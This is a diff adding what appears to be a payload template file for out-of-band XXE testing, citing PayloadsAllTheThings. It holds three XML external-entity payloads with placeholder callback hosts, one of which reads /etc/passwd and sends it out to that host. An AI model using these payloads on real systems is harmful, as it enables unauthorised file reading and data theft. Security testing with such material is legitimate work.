@@ -1,0 +1,4 @@
+# https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection#exploiting-blind-xxe-to-exfiltrate-data-out-of-band
+<?xml version="1.0" ?> <!DOCTYPE root [ <!ENTITY % oob SYSTEM "<PROTO>://<TOKEN>.<DOMAIN>/xxe"> %oob; ]><mole></mole>
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY % xxe SYSTEM "file:///etc/passwd"><!ENTITY callhome SYSTEM "<PROTO>://<TOKEN>.<DOMAIN>/e?%xxe;"> ] > <foo>&callhome;</foo>
+<?xml version="1.0" encoding="utf-8"?><!DOCTYPE data SYSTEM "<PROTO>://<TOKEN>.<DOMAIN>/dtd"><data>&send;</data>
